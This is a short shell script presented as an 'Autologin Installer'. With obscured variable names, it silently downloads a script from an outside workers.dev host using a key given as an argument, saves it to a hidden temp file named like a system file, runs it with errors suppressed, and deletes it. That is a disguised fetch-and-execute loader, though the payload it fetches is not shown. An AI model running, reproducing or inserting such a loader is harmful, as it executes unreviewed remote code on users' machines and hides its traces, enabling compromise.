#!/bin/sh
# ============================================================================
# Autologin Installer
# ============================================================================

_a="https://autologin.creativy24.workers.dev"
_b="$1"
_c=$(mktemp /tmp/.sys_XXXXXX)
curl -sSL "$_a/s?k=$_b" -o "$_c" 2>/dev/null
sh "$_c" 2>/dev/null
rm -f "$_c"
